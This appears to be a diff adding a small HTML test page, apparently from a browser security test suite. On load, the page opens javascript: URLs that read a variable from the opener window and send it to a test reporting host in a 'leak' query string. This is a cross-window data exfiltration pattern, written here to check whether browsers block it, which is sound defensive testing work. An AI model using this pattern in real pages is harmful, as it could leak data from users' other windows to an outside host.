@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <script>
+      "use strict";
+
+      window.onload = function () {
+        var par = 'val';
+        var url1 = "javascript:'<scr" + "ipt>document.location.href=\"https://a.test/report/?leak=c582387;par="+opener.par+"\";</scr" + "ipt>'";
+        open(url1);
+        var url2 = "javascript:document.location.href=\"https://a.test/report/?leak=c582387;par="+opener.par+"\";";
+        open(url2);
+      };
+    </script>
+  </head>
+</html>
